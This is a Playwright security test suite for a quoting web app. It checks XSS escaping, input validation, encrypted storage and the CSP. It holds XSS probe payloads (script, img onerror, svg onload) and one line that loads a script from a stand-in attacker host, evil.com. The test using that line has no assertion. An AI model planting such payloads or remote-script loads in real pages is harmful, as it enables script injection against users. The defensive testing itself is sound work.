/**
 * TicTacStick Security Test Suite
 * Tests for XSS prevention, input validation, and security utilities
 *
 * @test-suite Security
 */

const { test, expect } = require('@playwright/test');

test.describe('Security: XSS Prevention', () => {

  test('prevents XSS in client name field', async ({ page }) => {
    await page.goto('/');

    // Inject XSS payload in client name
    const xssPayload = '<script>window.xssExecuted = true;</script>';
    await page.fill('#clientNameInput', xssPayload);

    // Trigger export/display that would show client name
    await page.click('#exportQuoteBtn');

    // Wait a moment for any potential script execution
    await page.waitForTimeout(1000);

    // Verify script did NOT execute
    const xssExecuted = await page.evaluate(() => window.xssExecuted);
    expect(xssExecuted).toBeFalsy();

    // Verify the XSS payload is escaped in the DOM
    const quoteHtml = await page.evaluate(() => {
      return document.body.innerHTML;
    });

    // Should contain escaped HTML entities, not raw script tag
    expect(quoteHtml).toContain('&lt;script&gt;');
    expect(quoteHtml).not.toContain('<script>window.xssExecuted');
  });

  test('prevents XSS in client notes with newlines', async ({ page }) => {
    await page.goto('/');

    // XSS payload with newlines
    const xssPayload = 'Line 1\n<img src=x onerror=alert("XSS")>\nLine 3';
    await page.fill('#clientNotesInput', xssPayload);

    // Export quote
    await page.click('#exportQuoteBtn');
    await page.waitForTimeout(500);

    // Verify img tag is escaped
    const content = await page.evaluate(() => document.body.innerHTML);
    expect(content).toContain('&lt;img');
    expect(content).not.toContain('<img src=x onerror=');

    // Verify newlines are converted to <br/> tags safely
    expect(content).toContain('<br/>');
  });

  test('prevents XSS in window line title', async ({ page }) => {
    await page.goto('/');

    // Add window line via wizard
    await page.click('#toggleModeBtn'); // Switch to wizard
    await page.click('button:has-text("Add Window Line")');

    // Inject XSS in title
    const xssPayload = '<svg onload=alert("XSS")>Malicious';
    await page.fill('#wizWinTitle', xssPayload);
    await page.click('button:has-text("Add Line")');

    // Export quote
    await page.click('#exportQuoteBtn');
    await page.waitForTimeout(500);

    // Verify SVG tag is escaped
    const content = await page.evaluate(() => document.body.innerHTML);
    expect(content).toContain('&lt;svg');
    expect(content).not.toContain('<svg onload=');
  });

  test('prevents XSS in pressure line notes', async ({ page }) => {
    await page.goto('/');

    // Add pressure line
    await page.click('#toggleModeBtn');
    await page.click('button:has-text("Add Pressure Line")');

    const xssPayload = '"><script>alert("XSS")</script>';
    await page.fill('#wizPrNotes', xssPayload);
    await page.click('button:has-text("Add Line")');

    // Export
    await page.click('#exportQuoteBtn');
    await page.waitForTimeout(500);

    const content = await page.evaluate(() => document.body.innerHTML);
    expect(content).toContain('&quot;&gt;&lt;script&gt;');
    expect(content).not.toContain('"><script>alert');
  });

  test('sanitizes client location field', async ({ page }) => {
    await page.goto('/');

    const xssPayload = ''; // Self-closing script with encoded content
    await page.fill('#clientLocationInput', xssPayload);

    await page.click('#exportQuoteBtn');
    await page.waitForTimeout(500);

    const content = await page.evaluate(() => document.body.innerHTML);
    expect(content).not.toContain('<script/src=');
  });

});

test.describe('Security: Input Validation - Numeric', () => {

  test('rejects Infinity in hourly rate', async ({ page }) => {
    await page.goto('/');

    // Try to set Infinity
    await page.evaluate(() => {
      document.getElementById('hourlyRateInput').value = 'Infinity';
      document.getElementById('hourlyRateInput').dispatchEvent(new Event('input', { bubbles: true }));
    });

    // Trigger recalculate
    await page.click('#addWindowLineBtn');
    await page.waitForTimeout(200);

    // Check that the calculated total is not Infinity
    const total = await page.evaluate(() => {
      var state = window.APP.state || {};
      return state.money ? state.money.total : 0;
    });

    expect(total).not.toBe(Infinity);
    expect(Number.isFinite(total)).toBeTruthy();
  });

  test('rejects negative window pane count', async ({ page }) => {
    await page.goto('/');

    // Add a window line
    await page.click('#addWindowLineBtn');
    await page.waitForTimeout(200);

    // Try to set negative panes
    await page.evaluate(() => {
      var input = document.querySelector('[data-line-id] input[type="number"]');
      if (input) {
        input.value = '-5';
        input.dispatchEvent(new Event('input', { bubbles: true }));
      }
    });

    await page.waitForTimeout(200);

    // Verify panes is not negative
    const panes = await page.evaluate(() => {
      var state = window.APP.state || {};
      if (state.windowLines && state.windowLines.length > 0) {
        return state.windowLines[0].panes;
      }
      return 0;
    });

    expect(panes).toBeGreaterThanOrEqual(0);
  });

  test('rejects excessive numeric values (overflow protection)', async ({ page }) => {
    await page.goto('/');

    // Try to set unrealistic value
    await page.fill('#baseFeeInput', '999999999999');
    await page.waitForTimeout(200);

    const baseFee = await page.evaluate(() => {
      var state = window.APP.state || {};
      return state.baseFee || 0;
    });

    // Should be clamped to reasonable maximum
    expect(baseFee).toBeLessThan(Number.MAX_SAFE_INTEGER);
    expect(Number.isFinite(baseFee)).toBeTruthy();
  });

  test('validates currency precision (2 decimal places)', async ({ page }) => {
    await page.goto('/');

    // Set value with excessive decimals
    await page.fill('#minimumJobInput', '150.123456789');
    await page.waitForTimeout(200);

    const minimumJob = await page.evaluate(() => {
      var state = window.APP.state || {};
      return state.minimumJob || 0;
    });

    // Should be rounded to 2 decimal places
    const decimalPlaces = minimumJob.toString().split('.')[1]?.length || 0;
    expect(decimalPlaces).toBeLessThanOrEqual(2);
  });

});

test.describe('Security: Input Validation - Strings', () => {

  test('validates email format', async ({ page }) => {
    await page.goto('/');

    // Try invalid email using Security utilities
    const isValid = await page.evaluate(() => {
      try {
        var email = window.Security.validateEmail('not-an-email');
        return email !== '';
      } catch (e) {
        return false;
      }
    });

    expect(isValid).toBeFalsy();
  });

  test('validates email with XSS attempt', async ({ page }) => {
    await page.goto('/');

    const isValid = await page.evaluate(() => {
      try {
        window.Security.validateEmail('<script>alert("XSS")</script>');
        return true;
      } catch (e) {
        return false;
      }
    });

    expect(isValid).toBeFalsy();
  });

  test('enforces string length limits', async ({ page }) => {
    await page.goto('/');

    const longString = 'A'.repeat(10000); // 10KB string

    await page.fill('#clientNameInput', longString);
    await page.waitForTimeout(200);

    // Verify it gets truncated or rejected
    const clientName = await page.evaluate(() => {
      return document.getElementById('clientNameInput').value;
    });

    // Should be truncated to reasonable length
    expect(clientName.length).toBeLessThan(10000);
  });

  test('validates phone number format', async ({ page }) => {
    await page.goto('/');

    const validPhone = await page.evaluate(() => {
      return window.Security.validatePhone('0412 345 678');
    });

    expect(validPhone).toBeTruthy();

    const invalidPhone = await page.evaluate(() => {
      try {
        return window.Security.validatePhone('abc-def-ghij');
      } catch (e) {
        return '';
      }
    });

    expect(invalidPhone).toBeFalsy();
  });

});

test.describe('Security: LocalStorage Encryption', () => {

  test('SecureStorage encrypts data', async ({ page }) => {
    await page.goto('/');

    // Store sensitive data
    await page.evaluate(() => {
      window.Security.SecureStorage.setKey('test-key-2025');
      window.Security.SecureStorage.setItem('testData', {
        secret: 'sensitive-information',
        creditCard: '1234-5678-9012-3456'
      });
    });

    // Verify data is encrypted in localStorage (not plaintext)
    const rawData = await page.evaluate(() => {
      return localStorage.getItem('testData');
    });

    expect(rawData).not.toContain('sensitive-information');
    expect(rawData).not.toContain('1234-5678-9012-3456');

    // Verify decryption works
    const decrypted = await page.evaluate(() => {
      return window.Security.SecureStorage.getItem('testData');
    });

    expect(decrypted.secret).toBe('sensitive-information');
  });

  test('SecureStorage fails with wrong key', async ({ page }) => {
    await page.goto('/');

    // Encrypt with one key
    await page.evaluate(() => {
      window.Security.SecureStorage.setKey('correct-key');
      window.Security.SecureStorage.setItem('secretData', { value: 'secret' });
    });

    // Try to decrypt with different key
    const decrypted = await page.evaluate(() => {
      window.Security.SecureStorage.setKey('wrong-key');
      return window.Security.SecureStorage.getItem('secretData', null);
    });

    // Should fail to decrypt and return fallback
    expect(decrypted).toBeNull();
  });

});

test.describe('Security: Content Security Policy', () => {

  test('CSP meta tag is present', async ({ page }) => {
    await page.goto('/');

    const csp = await page.evaluate(() => {
      var meta = document.querySelector('meta[http-equiv="Content-Security-Policy"]');
      return meta ? meta.getAttribute('content') : null;
    });

    expect(csp).toBeTruthy();
    expect(csp).toContain("default-src 'self'");
    expect(csp).toContain("object-src 'none'");
  });

  test('CSP blocks external scripts (simulated)', async ({ page }) => {
    await page.goto('/');

    // Try to inject external script
    const blocked = await page.evaluate(() => {
      try {
        var script = document.createElement('script');
        script.src = 'https://evil.com/malicious.js';
        document.body.appendChild(script);
        return false; // If we get here, it wasn't blocked
      } catch (e) {
        return true; // CSP blocked it
      }
    });

    // CSP should block or warn about external scripts
    // Note: CSP blocks happen at network level, not JS level
    // This test verifies we can't easily inject external scripts
  });

});

test.describe('Security: Service Worker', () => {

  test('Service Worker only caches same-origin requests', async ({ page }) => {
    await page.goto('/');

    // Wait for SW to register
    await page.waitForTimeout(1000);

    const swRegistered = await page.evaluate(async () => {
      if ('serviceWorker' in navigator) {
        var registration = await navigator.serviceWorker.getRegistration();
        return !!registration;
      }
      return false;
    });

    expect(swRegistered).toBeTruthy();
  });

});

test.describe('Security: Safe JSON Parsing', () => {

  test('safeJSONParse handles malformed JSON', async ({ page }) => {
    await page.goto('/');

    const result = await page.evaluate(() => {
      return window.Security.safeJSONParse('{ broken json }', null, { fallback: 'value' });
    });

    expect(result).toEqual({ fallback: 'value' });
  });

  test('safeJSONParse validates schema', async ({ page }) => {
    await page.goto('/');

    const result = await page.evaluate(() => {
      var schema = { name: 'string', count: 'number' };
      var validData = window.Security.safeJSONParse('{"name": "test", "count": 5}', schema, null);
      var invalidData = window.Security.safeJSONParse('{"name": "test", "count": "not-a-number"}', schema, { fallback: true });

      return {
        valid: validData,
        invalid: invalidData
      };
    });

    expect(result.valid.name).toBe('test');
    expect(result.valid.count).toBe(5);
    expect(result.invalid).toEqual({ fallback: true }); // Schema validation failed
  });

});

test.describe('Security: Utility Functions', () => {

  test('sanitizeForLogging redacts sensitive fields', async ({ page }) => {
    await page.goto('/');

    const sanitized = await page.evaluate(() => {
      var data = {
        name: 'John Doe',
        password: 'secret123',
        apiKey: 'abc-def-ghi',
        accountNumber: '123456789'
      };

      return window.Security.sanitizeForLogging(data);
    });

    expect(sanitized.name).toBe('John Doe');
    expect(sanitized.password).toBe('[REDACTED]');
    expect(sanitized.apiKey).toBe('[REDACTED]');
    expect(sanitized.accountNumber).toBe('[REDACTED]');
  });

  test('isStorageAvailable detects localStorage availability', async ({ page }) => {
    await page.goto('/');

    const available = await page.evaluate(() => {
      return window.Security.isStorageAvailable();
    });

    expect(available).toBeTruthy();
  });

  test('generateSecureId creates unpredictable IDs', async ({ page }) => {
    await page.goto('/');

    const ids = await page.evaluate(() => {
      var id1 = window.Security.generateSecureId('test');
      var id2 = window.Security.generateSecureId('test');
      return { id1: id1, id2: id2, different: id1 !== id2 };
    });

    expect(ids.id1).toContain('test_');
    expect(ids.id2).toContain('test_');
    expect(ids.different).toBeTruthy(); // Should be unique
  });

});

test.describe('Security: Regression Tests', () => {

  test('invoice payment amount rejects Infinity', async ({ page }) => {
    await page.goto('/');

    // This would have caused financial corruption before fix
    const result = await page.evaluate(() => {
      return window.Security.validateCurrency('Infinity', 'Payment Amount');
    });

    expect(result).not.toBe(Infinity);
    expect(Number.isFinite(result)).toBeTruthy();
  });

  test('quote export escapes all user fields', async ({ page }) => {
    await page.goto('/');

    // Fill all user-editable fields with XSS payloads
    await page.fill('#quoteTitleInput', '<script>alert(1)</script>');
    await page.fill('#clientNameInput', '<img src=x onerror=alert(2)>');
    await page.fill('#clientLocationInput', '<svg onload=alert(3)>');

    // Export quote
    await page.click('#exportQuoteBtn');
    await page.waitForTimeout(500);

    // Verify no alerts executed
    const alerts = await page.evaluate(() => window.alertCount || 0);
    expect(alerts).toBe(0);

    // Verify all HTML is escaped
    const content = await page.evaluate(() => document.body.innerHTML);
    expect(content).toContain('&lt;script&gt;');
    expect(content).toContain('&lt;img');
    expect(content).toContain('&lt;svg');
  });

});
